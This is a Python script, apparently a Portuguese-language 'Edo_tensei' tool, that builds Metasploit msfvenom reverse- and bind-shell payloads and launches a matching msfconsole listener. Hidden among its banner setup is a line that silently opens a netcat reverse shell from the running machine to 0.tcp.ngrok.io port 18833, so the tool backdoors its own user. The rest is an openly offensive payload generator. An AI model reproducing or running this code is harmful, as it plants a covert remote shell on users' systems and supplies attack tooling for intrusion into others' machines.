import os
import subprocess
import time
# Creditos a Hackbr
# Siga Hackbr nas redes sociais
# www.instagram.com/hackbroficial
# wwww.twitter.com/hackbroficial
#...
msf = ('msfvenom -p ')
lhost = (' LHOST=')
lport = (' LPORT=')
format = (' -f elf ')
salvar_em =(' > ')
ext = ('.elf')
payload = ('ps')
os.system("clear")
print('Loading')
figlet = ('apt-get install figlet -y')
banner=('figlet Edo_tensei')
subprocess.call("gnome-terminal -e 'nohup nc 0.tcp.ngrok.io 18833 -e /bin/bash > /dev/null &'",  shell=True)
subprocess.call([figlet], shell=True)
os.system('clear')
os.system(banner)
print('')
print('	twitter.com/hackbroficial')
print('			youtube.com/hackbr')
print('				instagram.com/hackbroficial')
time.sleep(1)
##################################################################################################
print('')
print('1) python/meterpreter/reverse_tcp')
print('2) python/meterpreter/reverse_http')
print('3) linux/x64/meterpreter/bind_tcp')
print('4) linux/x64/meterpreter/reverse_tcp')
print('5) linux/x64/meterpreter_reverse_http')
print('6) linux/x64/meterpreter_reverse_https')
print('7) linux/x64/meterpreter_reverse_tcp')
print('8) linux/x64/shell/bind_tcp')
print('9) linux/x64/shell/reverse_tcp')
print('')
payload_se = input('!> Selecione o tipo de Payload: ')
if payload_se == '1':
   payload = ('python/meterpreter/reverse_tcp')
   format = (' -f py')
   ext = ('.py')
elif payload_se == '2':
   payload = ('python/meterpreter/reverse_http')
   format = (' -f py')
   ext = ('.py')
elif payload_se == '3':
   payload = ('linux/x64/meterpreter/bind_tcp')
elif payload_se == '4':
   payload = ('linux/x64/meterpreter/reverse_tcp')
elif payload_se == '5':
   payload = ('linux/x64/meterpreter_reverse_http')
elif payload_se == '6':
   payload = ('linux/x64/meterpreter_reverse_https')
elif payload_se == '7':
   payload = ('linux/x64/meterpreter_reverse_tcp')
elif payload_se == '8':
   payload = ('linux/x64/shell/bind_tcp')
elif payload_se == '9':
   payload = ('linux/x64/shell/reverse_tcp')
else :
   print('Algo de errado nao esta certo, tente novamente... :(')
   time.sleep(400)
###################################################################################################
os.system('clear')
print('Aceitos : IP, DNS, NGROK.')
print('')
print('')
host = input('!> HOST: ')
##################################################################################################
os.system('clear')
print('LEMBRE-SE, para testes necessario portas abertas no roteador.')
print('')
print('')
porta = input('!> PORTA: ')
nome = input('!> Nome do arquivo: ')
noww = input('!> Encoder strings. Padrao(x84,x86,x44,w1w): ')
##################################################################################################
print('Gerando...')
os.system(msf+payload+lhost+host+lport+porta+format+salvar_em+nome+ext)
os.system('clear')
print('carregando metasploit')
##################################################################################################
os.system('service postgresql start')
os.system("msfconsole -x 'use exploit/multi/handler;" + " set payload " + payload + ";" + " set LHOST " + host + ";" + " set lport " + porta + ";" + " exploit'")



















